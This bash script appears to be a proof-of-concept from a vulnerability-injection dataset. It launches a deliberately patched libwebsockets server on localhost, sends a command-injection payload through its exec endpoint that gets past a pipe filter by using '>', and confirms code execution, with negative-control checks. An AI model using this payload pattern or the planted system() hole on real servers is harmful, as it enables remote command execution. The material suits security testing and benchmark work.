#!/usr/bin/env bash
# PoC for 108_libwebsockets_C3I3S2
# Axes: C3 (three CLI flags + exec_gate_check() utility) /
#       I3 (exec_job struct dispatch then system()) /
#       S2 (block '|', bypass with ';')
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (lws_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lws_server"
WWWROOT="/tmp/poc_108_www"
MARKER="/tmp/poc_108_marker"
PORT=18108

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ─────────────────────────────────────────────────────────────
echo "[*] starting lws_server with --exec-mode --exec-audit on port $PORT..."
"$BINARY" --port "$PORT" --wwwroot "$WWWROOT" --exec-mode --exec-audit &
SERVER_PID=$!
sleep 0.5

# ── trigger ──────────────────────────────────────────────────────────────────
# Payload uses '>' (no pipe), so it passes the S2 '|' block.
# I3: URL arg → exec_job struct → run_exec_job() → system()
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ────────────────────────────────────────────────────────────────────
sleep 0.2
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── S2 check: '|' must be blocked ────────────────────────────────────────────
echo "[*] verifying S2: '|' should return 403..."
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${PORT}/exec?cmd=id%7Ctee%20${MARKER}" || true)
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] S2 check passed: pipe blocked with 403"
else
    echo "[!] S2 check unexpected response: $HTTP_CODE"
fi

# ── negative control: endpoint absent without --exec-mode ────────────────────
echo "[*] verifying gate: endpoint must be absent without --exec-mode..."
NEG_PORT=$((19000 + 108))
"$BINARY" --port "$NEG_PORT" --wwwroot "$WWWROOT" &
SAFE_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
